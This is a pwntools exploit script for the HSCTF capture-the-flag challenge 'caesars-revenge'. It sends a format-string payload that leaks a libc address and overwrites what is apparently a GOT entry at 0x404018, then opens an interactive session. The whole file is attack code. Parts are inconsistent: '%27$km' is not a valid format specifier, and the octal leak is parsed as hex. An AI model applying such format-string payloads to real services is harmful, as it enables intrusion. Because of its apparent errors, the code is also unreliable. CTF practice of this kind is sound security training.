#!/usr/bin/python
from pwn import *
import re
import sys

mode = 0
try :
    mode = int(sys.argv[1])
except :
    pass

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

HOST = 'pwn.hsctf.com'
PORT = 4567
# conn = remote(HOST, PORT)
conn = process('./caesars-revenge')

elf = ELF('./caesars-revenge')

p = str()
p += '%35$o'    # Leak _IO_file_write+45
p += '%' + str(0x00000000004014B3 - 18) + 'c'
p += 'A' * (10 - len(p) % 8) + '%27$km'
p += p64(0x0000000000404018)
p += '\n'


gdb.attach(
    conn,
    '''
    b *0x000000000040143A
    b *0x0000000000401461
    '''
)
raw_input()


conn.sendafter(': ', p)
conn.sendafter(': ', '1\n')
res = conn.recvuntil('encoded: ')
addr = int(re.findall('0x[0-9a-f]+', res)[0][2:], 16) - 45
print(hex(addr))


with open('temp', 'w') as f :
    f.write(hex(addr))
conn.interactive()